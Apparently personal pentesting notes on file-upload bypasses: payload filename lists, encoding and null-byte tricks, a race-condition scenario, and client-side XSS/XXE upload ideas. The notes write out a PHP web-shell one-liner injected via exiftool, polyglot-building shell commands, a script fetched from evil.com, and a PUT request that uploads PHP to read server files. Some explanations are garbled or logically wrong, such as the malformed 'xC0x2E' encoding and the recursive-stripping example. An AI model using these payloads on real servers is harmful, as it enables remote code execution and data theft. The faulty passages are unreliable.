

```bash
do.php%00.png
do.php%0A.png
do.php\n.png
do.php\u000a.png
do.php\u560a.png
do.php%E5%98%8A.png
do.php#.png
do.php%23.png
do.php\u0023.png
do.php;.png
do.php%3B.png
do.php\u003b.png
do.php\u563b.png
 do.php%E5%98%BB.png
```

Bypass Techniques

1. **Filename with a Trailing Dot**:
    - Upload: `exploit.php.`
    - Validation: Sees `.php.` as an invalid extension (not `.php` exactly) and allows it.
    - Server: Strips the trailing dot, saving the file as `exploit.php` and potentially executing it.
2. **Filename with a Trailing Space**:
    - Upload: `exploit.php␣` (where ␣ is a space).
    - Validation: Doesn’t recognize it as `.php` and approves it.
    - Server: Strips the trailing space, treating it as `exploit.php`.



3. **Single URL Encoding**:
    - Filename: `exploit%2Ephp`
    - Validation: Sees `%2E` (not a dot) and allows it, thinking it's safe.
    - Server: Decodes `%2E` to `.` and saves the file as `exploit.php`, potentially executing the malicious code.
4. **Double URL Encoding**:
    - Filename: `exploit%252Ephp`
        - `%25` is the encoding for `%`.
        - `%252E` decodes to `%2E`, which then decodes to `.`
    - Validation: May miss the double encoding and allow the upload.
    - Server: Decodes the filename twice, resulting in `exploit.php`.

5. **Example**:
    - Filename: `exploit.asp;.jpg`
    - The semicolon (`;`) creates confusion because:
        - Some validation systems stop processing at the semicolon and see only `.asp`.
        - Other systems see the full name `.asp;.jpg` and incorrectly classify it as safe.
    - Result: The server might process the file as an executable `.asp` script.

**Null Byte in Filename**:

- Null byte (`%00`) is a **string terminator** in lower-level languages like C. Anything after the null byte is ignored by these languages.
1. **Example**:
    - Filename: `exploit.php%00.jpg`
    - Validation (written in a higher-level language like PHP or Java):
        - Checks the entire string and sees `.jpg`, allowing the upload.
    - Server (lower-level code, such as C-based systems):
        - Stops reading at `%00` (null byte) and treats the file as `exploit.php`.
    - Result: The malicious PHP script is executed.

2. **Semicolon Exploit**:
    - Upload `exploit.asp;.jpg`.
    - Validation passes the file as a `.jpg` image.
    - The server interprets it as `exploit.asp` and executes it.
3. **Null Byte Exploit**:
    - Upload `exploit.php%00.jpg`.
    - Validation sees `.jpg` and approves the file.
    - The server saves it as `exploit.php`, and the PHP code executes.

4. **Obfuscated Dot (`.`)**:
    - Filename: `exploitxC0x2Ephp`
        - The validation system might fail to recognize `xC0 x2E` as a dot.
    - After normalization: The filename becomes `exploit.php`, and the server might execute it.
5. **Obfuscated Slash (`/`)**:
    - Filename: `..xC0x2F..xC0x2Fexploit.php`
        - Validation might not decode the slashes (`xC0 x2F`), allowing directory traversal.
    - After normalization: The path becomes `../../exploit.php`, and the file is saved or executed in an unintended location.
6. **Single Recursive Stripping**:
    - Upload: `exploit.phpphp`
    - Sanitization: The system removes `.php`, leaving `exploit.php`.
    - Result: The file is saved as `exploit.php` and executed.
7. **Multiple Recursive Stripping**:
    - Upload: `exploit.p.phphp`
    - Sanitization:
        1. First `.php` is stripped, resulting in `exploit.p.php`.
        2. The system doesn’t check again, allowing `exploit.p.php` to bypass validation.
    - Result: The server executes the file as PHP.


Flawed validation of the file's contents(magic bytes):
```bash
file spider.png #check type of file 
head -n 5 spider.png #checking the magic bytes five lines
head -n 5 spider.png > spiderman.png #redirecting five lines magic bytes newly created file
cat spiderman.png shell.php > magic_shell.php #redirecting both content spiderman.png shell.php to magic_shell.php
file magic_shell.php #verify con


exiftool -Comment='<?php eval($_GET["cmd"]); ?>' image.jpg
```



Race condition:
he Process on the Server:

1. **Step 1**: The server fetches the file from the internet and saves it temporarily (e.g., `/tmp/upload123.jpg`).
2. **Step 2**: After saving the file, the server checks:
    - Is it an actual image?
    - Is it safe (not malicious)?
3. **Step 3**: If everything is fine, the server moves the file to a permanent location, like `/uploads/profile123.jpg`.

---

What Can Go Wrong?

- When the file is saved temporarily (`/tmp/upload123.jpg`), it hasn’t been validated yet.
- During this **time gap** (between saving and validating), an **attacker** could exploit it.

---

How an Attacker Exploits This:

Let’s say the server gives the temporary file a random name, like `upload123.jpg`.

1. **Weak Randomness**: If the file name is predictable (e.g., using PHP’s `uniqid()`), an attacker might guess it.
2. **Brute Force**: The attacker uses a program to try all possible file names quickly (`/tmp/upload1.jpg`, `/tmp/upload2.jpg`, etc.).
3. **Malicious Action**: If the attacker guesses the file name before the server validates it, they could:
    - **Download it**: Access sensitive data in the file.
    - **Execute it**: If the server mistakenly treats the file as a script, the attacker’s malicious code could run.

---

Making It Easier for the Attacker:

1. **Large File Upload**: Attackers upload a very large file (e.g., 1GB). The server takes longer to process it, giving the attacker more time to guess the file name.
2. **Payload at the Start**: The malicious part of the file is at the beginning, so it can cause damage even before the server finishes processing.

---

Example Scenario:

1. You (the attacker) upload a malicious script, `https://evil.com/script.php`.
2. The server saves it as `/tmp/upload123.php`.
3. You guess the file name (`upload123.php`) and request it before the server validates it.
4. If the server executes `.php` files, your script runs, potentially taking control of the server.




file upload to xss attack or xxe attack or sql  injection:

you might not be able to execute scripts on the server, you may still be able to upload scripts for client-side attacks. For example, if you can upload HTML files or SVG images, you can potentially use <script> tags to create stored XSS payloads or even sql injection if possible . also uploading docx and svg file or xls we can perform xxe attack.

Uploading files using PUT

It's worth noting that some web servers may be configured to support PUT requests. If appropriate defenses aren't in place, this can provide an alternative means of uploading malicious files, even when an upload function isn't available via the web interface

```jsx
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/path/to/file'); ?>
```

<aside>
💡

You can try sending OPTIONS requests to different endpoints to test for any that advertise support for the PUT method.

</aside>




https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/